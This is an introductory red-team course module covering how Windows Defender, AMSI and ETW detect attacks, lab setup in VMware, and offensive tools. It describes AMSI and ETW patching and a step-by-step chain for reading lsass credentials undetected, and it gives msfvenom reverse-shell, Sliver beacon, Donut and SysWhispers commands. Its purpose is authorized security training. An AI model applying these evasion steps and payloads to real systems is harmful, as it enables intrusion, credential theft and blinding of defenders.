# Module 00 - Introduction to the Antivirus Landscape (2026)

---

## Who Is This Course For?

This course is for people who want to learn red teaming.

Red teaming means pretending to be an attacker.
You test a company's security by trying to break in.
You find the weak spots before real attackers do.

To do this well, you need to understand how antivirus (AV) works.
You also need to know how to get past it.

This is NOT a course to do illegal things.
This is for learning, testing, and getting better at security.

Always get written permission before testing any system.

---

## What You Will Learn in This Module

- What Windows Defender is and how it catches bad software
- What AMSI is and why it stops your scripts
- What ETW is and why it logs everything you do
- How attackers get caught (the common mistakes)
- How to build your lab from scratch using VMware Pro
- What open source tools you will use in this course

---

## PART 1: WHAT IS WINDOWS DEFENDER?

---

### 1.1 - The Basics

Windows Defender is the antivirus that comes built into Windows.

Every Windows 10 and Windows 11 computer has it.
It is turned on by default.
You do not need to install it.

In 2026, Windows Defender is actually very good.
Many paid antivirus products are not better than Defender.

As a red teamer, Defender is your main enemy.
If you can get past Defender, you can get past most antivirus.

---

### 1.2 - What Defender Actually Does

Defender does not just scan files.
It does many things at the same time.

Here is what Defender does:


#### A) Real-Time Scanning

When you download a file, Defender scans it right away.
When you open a file, Defender scans it.
When you copy a file, Defender scans it.

This happens in real time - meaning the moment it happens.

Defender looks at the file and checks:
- Does this file match any known malware? (signature check)
- Does this file look like malware? (heuristic check)
- Does this file behave like malware? (behavior check)

```
Example: You download a file called update.exe
Defender will:
1. Check the file hash against its database
2. Look at the code inside for known bad patterns
3. Watch what the file does when it runs
```


#### B) Cloud-Based Protection

Defender does not just check things on your computer.
It also sends suspicious files to Microsoft's cloud.

The cloud has more power and more data.
It can check things that your local computer cannot.

This is why sometimes Defender takes a few seconds to decide.
It is talking to the cloud.

```
How cloud scanning works:
1. You run a file
2. Defender is not sure if it is bad
3. Defender sends the file hash (or the file) to Microsoft
4. Microsoft checks against billions of known samples
5. Microsoft sends back the answer: safe or dangerous
6. This takes 1-5 seconds
```

This is important for red teamers because:
- Even if you bypass local scanning, the cloud might catch you
- The cloud updates faster than local signatures
- New malware can be detected within minutes of first being seen


#### C) Behavior Monitoring

This is the hardest part to get past.

Defender watches what programs DO, not just what they ARE.

Even if your file looks clean, if it does bad things, Defender will catch it.

Things Defender watches for:

```
- Opening other processes and writing to their memory
- Creating new threads in other processes
- Downloading files from the internet and running them
- Reading passwords from memory (like from lsass.exe)
- Changing system files or registry keys
- Running encoded PowerShell commands
- Using uncommon system tools in unusual ways
```

This is called "behavioral detection" and it is the biggest problem
for red teamers in 2026.


#### D) Tamper Protection

Defender protects itself.

You cannot just turn Defender off.
You cannot just delete Defender files.
You cannot just stop the Defender service.

Tamper Protection prevents anyone - even administrators - from
turning off Defender through normal means.

```
Things Tamper Protection blocks:
- Stopping the Defender service
- Changing Defender registry settings
- Deleting Defender files
- Disabling real-time protection through scripts
```

This is protected by PPL (Protected Process Light).
We will learn about PPL attacks in Module 12.


#### E) Attack Surface Reduction (ASR) Rules

ASR rules are extra rules that block common attack patterns.

For example:
```
- Block Office programs from creating child processes
- Block JavaScript and VBScript from running downloaded content
- Block credential stealing from lsass.exe
- Block process creation from WMI event subscriptions
- Block execution of unsigned scripts
- Block Win32 API calls from Office macros
```

ASR rules make the attacker's life much harder.
Many common attack paths are blocked by these rules.


#### F) Smart App Control (New in Windows 11)

This is a newer feature.

Smart App Control only allows trusted apps to run.
If an app is not known to Microsoft, it gets blocked.

It uses AI and cloud checking to decide if an app is safe.

For red teamers, this means:
- Your custom tools might get blocked before they even run
- You need to find ways to run code without dropping files
- Or you need to use already-trusted programs (LOLBins)

---

### 1.3 - How Defender Detects Malware (The Three Layers)

Think of Defender as having three layers of detection:

```
+------------------------------------------+
|                                          |
|   LAYER 1: STATIC ANALYSIS              |
|   (Looking at the file before it runs)   |
|                                          |
+------------------------------------------+
|                                          |
|   LAYER 2: DYNAMIC ANALYSIS             |
|   (Watching the file while it runs)      |
|                                          |
+------------------------------------------+
|                                          |
|   LAYER 3: CLOUD ANALYSIS               |
|   (Sending data to Microsoft servers)    |
|                                          |
+------------------------------------------+
```

#### Layer 1 - Static Analysis

This happens BEFORE the file runs.

Defender looks at the file on disk.
It checks:
- The file's hash (SHA256) against a big list of known malware
- Patterns inside the file (strings, byte sequences)
- The file's structure (imports, sections, resources)
- If the file is packed or encrypted (this is suspicious)

```
Example of a signature match:

Your file contains this string:
"Invoke-Mimikatz"

Defender sees this string and says:
"This is a known attack tool - BLOCKED!"

This is why string obfuscation matters.
If you break up the string, Defender cannot match it.

"Inv" + "oke-" + "Mimi" + "katz"
```


#### Layer 2 - Dynamic Analysis (Behavior)

This happens WHILE the file runs.

Defender watches:
- What APIs the program calls
- What memory operations it does
- What network connections it makes
- What files it creates or changes
- What processes it starts or injects into

```
Example of behavioral detection:

Your program does this:
1. Opens notepad.exe process
2. Allocates memory in notepad with EXECUTE permission
3. Writes shellcode to notepad's memory
4. Creates a new thread in notepad

Defender sees this pattern and says:
"This looks like process injection - BLOCKED!"

Even though your file had no known signatures,
the BEHAVIOR matched a known attack pattern.
```


#### Layer 3 - Cloud Analysis

This is the cloud check.

When Defender is not sure, it asks Microsoft.
Microsoft has:
- More computing power
- Machine learning models
- Data from billions of computers
- The latest threat information

```
Cloud analysis flow:

1. Unknown file is seen on your computer
2. Defender sends metadata to Microsoft
3. If needed, Defender sends the actual file
4. Microsoft runs the file in a sandbox
5. Microsoft checks the behavior
6. Microsoft sends back a verdict
7. This verdict is shared with ALL Defender users

This means: if your malware is caught on ONE computer,
it might be blocked on ALL computers within minutes.
```

---

### 1.4 - Defender's Signature Updates

Defender updates its malware signatures every day.
Sometimes multiple times per day.

You can check your current signature version:

```powershell
# Check Defender status
Get-MpComputerStatus

# Check signature version and update time
Get-MpComputerStatus | Select-Object AntivirusSignatureVersion, AntivirusSignatureLastUpdated

# Force a signature update
Update-MpSignature
```

This is why a bypass that works today might not work tomorrow.
Microsoft adds new signatures all the time.

---

## PART 2: WHAT IS AMSI?

---

### 2.1 - AMSI Explained Simply

AMSI stands for Anti-Malware Scan Interface.

Think of it as a checkpoint.

When you run a PowerShell script, the script goes through AMSI first.
AMSI checks the script before it actually runs.

```
Without AMSI:
PowerShell Script ---> Execution

With AMSI:
PowerShell Script ---> AMSI Check ---> If clean ---> Execution
                                   ---> If bad   ---> BLOCKED
```

AMSI is not just for PowerShell.
It checks:
- PowerShell scripts
- VBScript
- JavaScript (via Windows Script Host)
- .NET assemblies loaded in memory
- Office VBA macros
- WMI scripts


### 2.2 - Why AMSI Is a Problem for Red Teamers

Before AMSI existed, you could do this:

```powershell
# Encode your attack script in Base64
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))

# Run it
powershell -EncodedCommand $encoded
```

The antivirus would scan the file on disk.
But since the script was encoded, the file looked clean.
The script would decode in memory and run.

AMSI changed this.

Now, even if the script is encoded, AMSI sees the DECODED version.
AMSI checks the actual code that is about to run.

```
Old way (before AMSI):
Encoded Script on Disk ---> AV scans encoded text ---> Looks clean ---> Runs

New way (with AMSI):
Encoded Script on Disk ---> Script decodes in memory ---> AMSI scans decoded text ---> Caught!
```


### 2.3 - How AMSI Works (Step by Step)

Here is what happens inside Windows when you run a PowerShell command:

```
Step 1: You type a command in PowerShell
Step 2: PowerShell prepares to run the command
Step 3: PowerShell calls AmsiScanBuffer() function
Step 4: AmsiScanBuffer sends the command text to the AV
Step 5: The AV (Defender) checks the text
Step 6: The AV returns: AMSI_RESULT_CLEAN or AMSI_RESULT_DETECTED
Step 7: If clean, PowerShell runs the command
Step 7: If detected, PowerShell blocks the command
```

The key function is `AmsiScanBuffer()` inside `amsi.dll`.

This DLL is loaded into every PowerShell process.

```
Key AMSI Functions:
- AmsiInitialize()    - Starts the AMSI session
- AmsiOpenSession()   - Opens a scan session
- AmsiScanBuffer()    - Scans a piece of text/code
- AmsiScanString()    - Scans a string
- AmsiCloseSession()  - Closes the scan session
- AmsiUninitialize()  - Ends the AMSI session
```


### 2.4 - Why AMSI Bypasses Are Important

If you can break AMSI, you can run any PowerShell script.

That is why AMSI bypass is usually the FIRST thing a red teamer does.

Common AMSI bypass ideas (we will learn details in Module 01):

```
1. Patch AmsiScanBuffer in memory
   - Change the function so it always returns "clean"
   - This means AMSI never actually scans anything

2. Corrupt the AMSI context
   - Break the AMSI session so it cannot work
   - AMSI fails silently and scripts run

3. Use reflection to modify AMSI internals
   - Use .NET reflection to change AMSI variables
   - Make AMSI think it is already initialized (but broken)

4. Hardware breakpoints
   - Set a breakpoint on AmsiScanBuffer
   - When it gets called, change the return value
   - This does not change any code in memory (stealthier)
```

We will practice all of these in Module 01.

---

## PART 3: WHAT IS ETW?

---

### 3.1 - ETW Explained Simply

ETW stands for Event Tracing for Windows.

Think of it as a spy that watches everything.

Every time something happens on Windows, ETW can log it.
Process starts, network connections, file changes, API calls - everything.

```
ETW is like a camera system:
- It records what programs do
- It sends the recordings to security tools
- Defender uses these recordings to find bad behavior
- Blue teams use these recordings to investigate attacks
```


### 3.2 - How ETW Works

ETW has three parts:

```
+-------------+      +-------------+      +-------------+
|             |      |             |      |             |
|  PROVIDERS  | ---> | CONTROLLERS | ---> | CONSUMERS   |
|             |      |             |      |             |
+-------------+      +-------------+      +-------------+

Providers:  Things that create events (processes, drivers, etc.)
Controllers: Things that manage which events to collect
Consumers:  Things that read and use the events (Defender, Sysmon)
```

Windows has hundreds of ETW providers built in.

Some important ones for security:

```
Provider Name                              What It Logs
------------------------------------------------------------
Microsoft-Windows-PowerShell               PowerShell commands
Microsoft-Windows-DotNETRuntime            .NET assembly loading
Microsoft-Antimalware-Scan-Interface       AMSI scan results
Microsoft-Windows-Kernel-Process           Process creation
Microsoft-Windows-Security-Auditing        Login events, policy changes
Microsoft-Windows-WMI-Activity             WMI commands
```


### 3.3 - Why ETW Matters for Red Teamers

When you run attack tools, ETW logs what you do.

Example:

```
You run Mimikatz in PowerShell:
- ETW logs the PowerShell command
- ETW logs the .NET assembly load
- ETW logs the process access to lsass.exe
- ETW logs the credential read

Even if Defender does not block you in real time,
the blue team can see EVERYTHING you did later.
```

This is why red teamers need to disable or patch ETW.

If you do not disable ETW:
- Your attack might succeed
- But the blue team will see exactly what you did
- They will know which tool you used
- They will know which computer you hit
- They will track your whole attack path


### 3.4 - ETW Patching (Preview)

Just like AMSI, you can patch ETW functions in memory.

The main target is `EtwEventWrite()` in `ntdll.dll`.

```
Normal ETW flow:
Program does something ---> EtwEventWrite logs it ---> Event is sent to consumers

Patched ETW flow:
Program does something ---> EtwEventWrite is patched (returns immediately) ---> No event is logged
```

We will learn exactly how to do this in Module 02.

---

## PART 4: HOW ATTACKERS GET CAUGHT

---

### 4.1 - The Five Most Common Mistakes

Understanding how attackers get caught is just as important as
knowing how to bypass defenses.

Here are the five most common mistakes:


#### Mistake 1: Using Known Tools Without Changes

```
BAD: Download Mimikatz.exe and run it
     Defender has signatures for every version of Mimikatz
     You will be caught in less than 1 second

BETTER: Modify the source code, change strings, recompile
        This breaks the signature match
        But behavioral detection can still catch you

BEST: Write your own tool that does the same thing
      Use different APIs, different patterns
      Defender has no signature for your custom tool
```


#### Mistake 2: Using PowerShell Without AMSI Bypass

```
BAD: Run attack scripts directly in PowerShell
     AMSI will scan every line and catch known attacks

BETTER: Bypass AMSI first, then run your scripts
        Without AMSI, PowerShell cannot check your scripts

BEST: Avoid PowerShell completely
      Use C#, C++, or Python instead
      These languages have less monitoring (but still some)
```


#### Mistake 3: Not Cleaning Up Logs

```
BAD: Run your attack and leave all logs behind
     The blue team reads the logs and sees everything

BETTER: Clear specific event logs after your attack
        This removes evidence but clearing logs itself is suspicious

BEST: Patch ETW BEFORE your attack so logs are never created
      You cannot delete what was never written
```


#### Mistake 4: Creating Suspicious Processes

```
BAD: Your malware creates cmd.exe as a child of Excel
     Excel should never create cmd.exe
     This is a clear indicator of attack

BETTER: Use process creation that makes sense
        Excel -> Word? Normal.
        Explorer -> Chrome? Normal.
        Word -> cmd.exe? Very suspicious.

BEST: Use parent PID spoofing
      Make it look like the right parent created the process
      We learn this in Module 11
```


#### Mistake 5: Writing Files to Disk

```
BAD: Download your tools to C:\Users\Public\tool.exe
     Every file on disk gets scanned by Defender

BETTER: Download to a less-watched location
        But Defender still scans files everywhere

BEST: Never touch disk at all
      Run everything in memory
      "Fileless" attacks are much harder to detect
```


### 4.2 - Detection Types (Know Your Enemy)

Defender uses different types of detection.
You need to know all of them:

```
Detection Type      What It Does                    How to Beat It
---------------------------------------------------------------------------
Signature           Matches known file hashes        Change the file
                    and byte patterns

String Match        Looks for known bad strings      Obfuscate strings
                    like "Invoke-Mimikatz"

Heuristic           Guesses if something is bad      Change code structure
                    based on patterns

Behavioral          Watches what the program does     Change attack pattern
                    (API calls, memory access)

Cloud ML            Machine learning in the cloud     Hard to beat - varies
                    analyzes unknown files

AMSI                Scans scripts at runtime          Patch AMSI in memory

ETW                 Logs behavior events              Patch ETW in memory
```


### 4.3 - Real Example: How a Simple Attack Gets Caught

Let's walk through a real example.

An attacker wants to steal passwords using Mimikatz.

```
Step 1: Attacker downloads mimikatz.exe
        CAUGHT! Defender matches the file hash.
        Detection: Signature match.

Step 2: Attacker recompiles Mimikatz with different strings
        File downloads OK.
        Attacker runs mimikatz.exe
        CAUGHT! Defender sees the process reading lsass.exe memory.
        Detection: Behavioral match.

Step 3: Attacker uses PowerShell version of Mimikatz
        Types: Invoke-Mimikatz
        CAUGHT! AMSI scans the PowerShell and finds the known script.
        Detection: AMSI string match.

Step 4: Attacker patches AMSI first, then runs Mimikatz script
        AMSI is bypassed. Script runs.
        Mimikatz reads lsass.exe memory.
        CAUGHT! Defender behavioral monitor sees lsass access.
        Detection: Behavioral - process access to lsass.

Step 5: Attacker uses a custom C# tool with direct syscalls
        Bypasses AMSI (not PowerShell).
        Uses direct syscalls (bypasses API hooks).
        Reads lsass memory using NtReadVirtualMemory syscall.
        SUCCESS - but ETW might still log the activity.

Step 6: Attacker patches ETW too
        No logs are created.
        Custom tool runs with direct syscalls.
        No AMSI check.
        No behavioral hooks triggered.
        SUCCESS - clean attack.
```

This shows you why you need MULTIPLE evasion techniques.
One bypass is not enough. You need a chain of bypasses.

---

## PART 5: LAB SETUP (Step by Step)

---

### 5.1 - What You Need

To practice everything in this course, you need a lab.

Your lab will have:
- Your main computer (the attacker machine)
- A Windows 11 virtual machine (the target machine)
- VMware Workstation Pro (to run virtual machines)
- A Linux VM or your main machine for attack tools

Hardware you need:
```
Minimum:
- CPU: 4 cores (8 threads)
- RAM: 16 GB
- Disk: 100 GB free space
- Internet connection

Better:
- CPU: 8 cores (16 threads)
- RAM: 32 GB
- Disk: 256 GB SSD free space
- Fast internet connection
```


### 5.2 - Step 1: Install VMware Workstation Pro

VMware Workstation Pro is now free for personal use (as of 2024).

```
How to get VMware Workstation Pro:

1. Go to: https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion
   (Or search: "VMware Workstation Pro download free personal")

2. Click "Download Now" for Workstation Pro
   - Choose the Windows version
   - It will download a .exe file (about 600 MB)

3. Run the installer
   - Double-click the downloaded file
   - Click "Next" through the wizard
   - Accept the license agreement
   - Choose install location (default is fine)
   - IMPORTANT: Check "Add VMware to system PATH"
   - Click "Install"
   - Wait for installation to finish (5-10 minutes)

4. Restart your computer when asked

5. Open VMware Workstation Pro
   - It should open without asking for a license key
   - If it asks, choose "Use for Personal Use"
```


### 5.3 - Step 2: Download Windows 11 ISO

You need a Windows 11 installation file.

```
How to get Windows 11 ISO:

1. Go to: https://www.microsoft.com/software-download/windows11

2. Scroll down to "Download Windows 11 Disk Image (ISO)"

3. Select "Windows 11 (multi-edition ISO)"

4. Click "Download Now"

5. Choose your language (English works best for security tools)

6. Click "64-bit Download"

7. The ISO file will download (about 5-6 GB)
   Save it somewhere you can find it easily
   Example: C:\ISOs\Win11.iso
```


### 5.4 - Step 3: Create the Windows 11 VM

Now you create the virtual machine.

```
Step by step in VMware:

1. Open VMware Workstation Pro

2. Click "File" -> "New Virtual Machine"
   Or click "Create a New Virtual Machine"

3. Choose "Custom (advanced)" and click Next

4. Hardware compatibility: Keep the default (latest version)
   Click Next

5. Select "I will install the operating system later"
   Click Next

   (We do this so we can change settings before installing)

6. Guest Operating System:
   - Select "Microsoft Windows"
   - Version: "Windows 11 x64"
   Click Next

7. Virtual Machine Name:
   - Name: "Win11-Target"
   - Location: Choose where to save it
   Click Next

8. Firmware type:
   - Select "UEFI" (Windows 11 needs UEFI)
   - Check "Secure Boot" (Windows 11 needs this)
   Click Next

9. Processors:
   - Number of processors: 1
   - Number of cores per processor: 4
   (Give it at least 4 cores)
   Click Next

10. Memory:
    - Give at least 4096 MB (4 GB)
    - 8192 MB (8 GB) is better
    Click Next

11. Network Type:
    - Select "NAT" (this shares your internet)
    Click Next

12. I/O Controller: Keep default (LSI Logic SAS)
    Click Next

13. Disk Type: Keep default (NVMe)
    Click Next

14. Disk:
    - Select "Create a new virtual disk"
    Click Next

15. Disk Size:
    - 80 GB minimum
    - Check "Store virtual disk as a single file"
    Click Next

16. Disk file name: Keep default
    Click Next

17. Click "Finish"
```


### 5.5 - Step 4: Add the Windows 11 ISO

Now connect the ISO file to the VM.

```
1. In VMware, select your "Win11-Target" VM

2. Click "Edit virtual machine settings"

3. Click on "CD/DVD (SATA)"

4. On the right side, select "Use ISO image file"

5. Click "Browse" and find your Windows 11 ISO file

6. Click OK

7. IMPORTANT: Also add a TPM module
   - Click "Add" at the bottom
   - Select "Trusted Platform Module"
   - Click "Finish"
   (Windows 11 requires TPM 2.0)
```


### 5.6 - Step 5: Install Windows 11

```
1. Click "Power on this virtual machine"

2. When you see "Press any key to boot from CD/DVD"
   Press any key quickly

3. Windows Setup will appear:
   - Language: English (United States)
   - Time: Choose your timezone
   - Keyboard: US
   Click "Next"

4. Click "Install now"

5. Click "I don't have a product key"
   (We are using it for testing only)

6. Select "Windows 11 Pro"
   (Pro has more features we need for testing)
   Click "Next"

7. Accept the license terms
   Click "Next"

8. Choose "Custom: Install Windows only"

9. Select the virtual disk (should show ~80 GB)
   Click "Next"

10. Windows will install (takes 10-20 minutes)
    The VM will restart several times - this is normal

11. After restart, follow the setup wizard:
    - Country: Choose yours
    - Keyboard: Choose yours
    - Connect to network: Click "Next"
    
12. IMPORTANT - Microsoft Account:
    To skip Microsoft account and use a local account:
    - When it asks for Microsoft account
    - Type: no@thankyou.com
    - Password: anything
    - It will say "something went wrong"
    - Now it will let you create a local account

13. Create local account:
    - Username: redteam
    - Password: Choose something simple for lab use
    - Security questions: Fill in anything

14. Privacy settings:
    - Turn everything OFF (we do not want extra telemetry)
    Click "Accept"

15. Wait for Windows to finish setup
    Desktop will appear
```


### 5.7 - Step 6: Install VMware Tools

VMware Tools makes the VM work better.

```
1. In VMware menu bar, click "VM" -> "Install VMware Tools"

2. In the Windows VM, open File Explorer

3. Go to "This PC" -> DVD Drive

4. Double-click "setup64.exe"

5. Follow the installer:
   - Click "Next"
   - Choose "Complete" install
   - Click "Install"
   - Click "Finish"

6. Restart the VM when asked
```

After VMware Tools:
- You can resize the VM window
- Copy/paste works between host and VM
- Drag and drop files works
- Better graphics


### 5.8 - Step 7: Update Windows 11

You need Windows to be fully updated for realistic testing.

```
1. Click Start -> Settings -> Windows Update

2. Click "Check for updates"

3. Let it download and install ALL updates

4. Restart when asked

5. Check for updates AGAIN after restart
   (Sometimes there are more updates)

6. Repeat until it says "You're up to date"

This can take 30-60 minutes depending on internet speed.
Do NOT skip this step. We want a fully patched system.
```


### 5.9 - Step 8: Check Defender is Working

Make sure Defender is fully active and updated.

```powershell
# Open PowerShell as Administrator
# Right-click Start -> Windows Terminal (Admin)

# Check Defender status
Get-MpComputerStatus

# Look for these values:
# AMServiceEnabled                 : True
# AntispywareEnabled               : True
# AntivirusEnabled                 : True
# BehaviorMonitorEnabled           : True
# IoavProtectionEnabled            : True
# NISEnabled                       : True
# RealTimeProtectionEnabled        : True

# Update Defender signatures
Update-MpSignature

# Check Defender version
Get-MpComputerStatus | Select-Object AMProductVersion, AntivirusSignatureVersion
```

If all these are True, Defender is fully working.
This is what you want - you need to practice against real protection.


### 5.10 - Step 9: Create a Snapshot

VERY IMPORTANT: Take a snapshot now.

A snapshot saves the current state of the VM.
If you break something, you can go back to this clean state.

```
1. In VMware, make sure the VM is running

2. Click "VM" -> "Snapshot" -> "Take Snapshot"

3. Name it: "Clean-Win11-Updated"

4. Description: "Fresh Windows 11 with all updates and Defender active"

5. Click "Take Snapshot"

You should take snapshots at key points:
- After clean install (this one)
- Before testing new techniques
- After setting up test tools
```


### 5.11 - Step 10: Set Up Network Isolation (Optional but Safe)

For safety, you might want to isolate the VM from your real network.

```
Option A: Host-Only Network (No Internet for VM)

1. In VMware, go to "Edit" -> "Virtual Network Editor"
2. Click "Change Settings" (admin)
3. Select VMnet1 (Host-only)
4. Make sure it is enabled
5. Go to your VM settings
6. Change Network Adapter from "NAT" to "Host-only"

The VM can talk to your host but not the internet.
Good for testing without risk.


Option B: NAT with Firewall (Internet but Controlled)

1. Keep the VM on NAT
2. Inside the VM, use Windows Firewall to control traffic
3. This lets you test things that need internet
4. But you control what goes in and out

For this course, use NAT so you have internet access.
You need it to download tools and test C2 connections.
```


### 5.12 - Step 11: Set Up Your Attacker Machine

You need a machine to attack FROM.

Best option: A Linux VM (Kali or Ubuntu)

```
Option A: Kali Linux VM (Easy - Comes with Most Tools)

1. Go to: https://www.kali.org/get-kali/#kali-virtual-machines
2. Download the VMware version (64-bit)
3. Extract the .7z file
4. Open the .vmx file in VMware
5. Default login: kali / kali
6. Update: sudo apt update && sudo apt full-upgrade -y


Option B: Ubuntu VM (Lighter - Install What You Need)

1. Go to: https://ubuntu.com/download/desktop
2. Download Ubuntu 24.04 LTS ISO
3. Create a new VM in VMware (similar to Windows 11 steps)
4. Install Ubuntu
5. Install tools as needed


Option C: Use Your Host Machine (Windows)

If you prefer to attack from Windows:
- Install Python 3
- Install Visual Studio Community (for C# and C++)
- Install Git
- This works but Linux has more built-in attack tools
```

For this course, we will mostly use:
- The Windows 11 VM as the TARGET
- Your host machine or a Linux VM as the ATTACKER

---

## PART 6: INTRODUCTION TO OPEN SOURCE TOOLS

---

### 6.1 - The Tools We Will Use

This course uses only free, open source tools.
No paid tools needed.

Here is what we will use and why:

```
Tool                 What It Does                          Module
-------------------------------------------------------------------
Metasploit           Generate payloads, exploit, post-      All
                     exploitation framework

msfvenom             Create custom payloads (shellcode,     00, 08
                     executables)

PowerShell           Run scripts, AMSI bypass, recon        01, 02

Sliver C2            Modern command and control framework   All
                     (send commands to target)

Mythic C2            Modular C2 framework with many         All
                     agent types

Donut                Convert .NET assemblies to shellcode   04, 08

SysWhispers          Generate direct syscall code           06

Invoke-Obfuscation   Obfuscate PowerShell scripts           05

Seatbelt             Situational awareness (find info       07
                     on target)

SharpCollection      Pre-compiled C# attack tools           Various

Rubeus               Kerberos attack tool                   Various

Certify              Certificate abuse tool                 Various

mimikatz             Credential dumping (source code)       Various
```


### 6.2 - Metasploit Framework

Metasploit is the most well-known attack framework.
It has been around for many years and is still useful in 2026.

```
What Metasploit does:
- Has thousands of exploits for different systems
- Can generate payloads (code that runs on the target)
- Handles connections from compromised machines
- Has post-exploitation modules (what to do after you get in)
```

Install Metasploit on Kali (already installed) or Ubuntu:

```bash
# On Kali Linux - already installed
msfconsole

# On Ubuntu - install from rapid7
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

Basic Metasploit usage:

```bash
# Start Metasploit
msfconsole

# Search for a module
msf6 > search type:payload platform:windows meterpreter

# Use a payload
msf6 > use payload/windows/x64/meterpreter/reverse_tcp

# Set options
msf6 > set LHOST 192.168.1.100
msf6 > set LPORT 4444

# Generate the payload
msf6 > generate -f exe -o payload.exe
```


### 6.3 - msfvenom (Payload Generator)

msfvenom is part of Metasploit.
It creates payloads in different formats.

```bash
# Basic Windows reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# Shellcode in C format (for custom loaders)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c

# Shellcode in C# format
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f csharp

# Shellcode in Python format
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh

# With encoding (basic evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/xor_dynamic -f exe -o encoded_shell.exe
```

IMPORTANT: msfvenom payloads are well known to Defender.
By themselves, they will be caught.
We use msfvenom to generate the raw shellcode.
Then we wrap it in our own custom loader.


### 6.4 - Sliver C2 Framework

Sliver is a modern C2 framework made by Bishop Fox.
It is written in Go and is very active in 2026.

Why Sliver over Metasploit for C2:
```
Metasploit C2 (Meterpreter):
- Very well known
- Heavily signatured by Defender
- Hard to use without getting caught

Sliver C2:
- Newer, less signatured
- Written in Go (compiles to native code)
- Supports multiple transport protocols
- Active development in 2026
- Better evasion features built in
```

Install Sliver:

```bash
# On Linux (Kali or Ubuntu)
curl https://sliver.sh/install | sudo bash

# Start the Sliver server
sliver-server

# You will see the Sliver console
sliver >
```

Basic Sliver usage:

```bash
# Generate a beacon (checks in every 60 seconds)
sliver > generate beacon --mtls 192.168.1.100 --save /tmp/beacon.exe

# Generate a session (always connected)
sliver > generate --mtls 192.168.1.100 --save /tmp/session.exe

# Start the listener
sliver > mtls

# When a beacon calls back, you will see it
sliver > beacons

# Interact with a beacon
sliver > use <beacon-id>

# Run commands
sliver (BEACON) > shell
sliver (BEACON) > whoami
sliver (BEACON) > ps    (list processes)
sliver (BEACON) > ls    (list files)
```

Sliver also supports:
```
- HTTP/HTTPS listeners (blend with web traffic)
- DNS listeners (very stealthy)
- WireGuard listeners (encrypted tunnel)
- Named pipe pivoting (move inside networks)
- In-memory .NET assembly execution
- SOCKS5 proxy
- Port forwarding
```


### 6.5 - Mythic C2 Framework

Mythic is another great open source C2.
It uses Docker and has a web interface.

Why use Mythic:
```
- Web-based UI (easy to use)
- Supports many different agents
- Very modular - add new agents easily
- Good for team operations
- Active development in 2026
```

Install Mythic:

```bash
# On Linux (needs Docker)

# Install Docker first if you do not have it
sudo apt install docker.io docker-compose -y
sudo systemctl start docker
sudo systemctl enable docker

# Clone Mythic
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic

# Install
sudo ./install_docker_ubuntu.sh
sudo make

# Start Mythic
sudo ./mythic-cli start

# Get the admin password
sudo ./mythic-cli config get admin_password

# Open in browser: https://your-ip:7443
# Login with: mythic_admin / <password from above>
```

Install an agent for Mythic:

```bash
# Apollo agent (C# agent for Windows)
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git

# Poseidon agent (Go agent for Linux/Mac)
sudo ./mythic-cli install github https://github.com/MythicAgents/Poseidon.git

# Athena agent (cross-platform .NET)
sudo ./mythic-cli install github https://github.com/MythicAgents/Athena.git
```

Mythic agents for Windows:
```
Agent Name    Language    Notes
-----------------------------------------------
Apollo        C#          Full-featured Windows agent
Athena        .NET        Cross-platform, modern
Medusa        Python      Python-based agent
```


### 6.6 - PowerShell Tools

PowerShell is very powerful for red teaming.
Many attack tools are written in PowerShell.

Important PowerShell tools:

```powershell
# PowerSploit - Collection of attack modules
# (Archived but still very educational)
# Includes: Invoke-Mimikatz, PowerView, etc.

# PowerSharpPack - Run C# tools in PowerShell
# Loads compiled C# directly into memory

# Nishang - Offensive PowerShell scripts
# Includes: shells, escalation, exfiltration

# PowerView - Active Directory enumeration
# Find users, groups, permissions, trust relationships
```

Note about PowerShell in 2026:
```
PowerShell is HEAVILY monitored now.
- AMSI scans all PowerShell
- Script Block Logging records all commands
- Constrained Language Mode limits what you can do
- Module Logging records which modules are loaded

This is why AMSI bypass is the first step.
And this is why many red teamers moved to C# and Go.
But PowerShell is still useful and important to learn.
```


### 6.7 - Donut (Shellcode Generator)

Donut converts .NET assemblies and PE files into shellcode.

Why this matters:
```
You have: A C# tool (like Rubeus.exe)
You want: Shellcode that runs this tool in memory

Donut does this conversion.
The shellcode can then be injected into any process.
No file is ever written to disk.
```

```bash
# Install Donut on Linux
git clone https://github.com/TheWover/donut.git
cd donut
make

# Convert a .NET assembly to shellcode
./donut -f Rubeus.exe -o rubeus.bin

# With specific parameters
./donut -f Rubeus.exe -o rubeus.bin -p "kerberoast /nowrap"

# Output as C# byte array
./donut -f Rubeus.exe -o rubeus.bin -t csharp
```


### 6.8 - SysWhispers (Syscall Generator)

SysWhispers helps you make direct system calls.
This bypasses the hooks that EDR products place on Windows APIs.

```
Normal API call flow:
Your Code -> kernel32.dll -> ntdll.dll -> Kernel
                                ^
                                |
                           EDR Hook Here
                           (EDR sees your call)

Direct syscall flow:
Your Code -> Kernel (directly)
(EDR hook is skipped)
```

```bash
# Install SysWhispers3
git clone https://github.com/klezVirus/SysWhispers3.git
cd SysWhispers3
pip3 install -r requirements.txt

# Generate syscall stubs for specific functions
python3 syswhispers.py -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls

# This creates .h, .c, and .asm files
# Include them in your C/C++ project
```

We will use SysWhispers heavily in Module 06.


### 6.9 - Other Useful Tools

Here are more tools you will see in this course:

```
Invoke-Obfuscation
- What: PowerShell script obfuscator
- Why: Makes PowerShell scripts harder to detect
- Link: https://github.com/danielbohannon/Invoke-Obfuscation

Scarecrow
- What: Payload creation framework
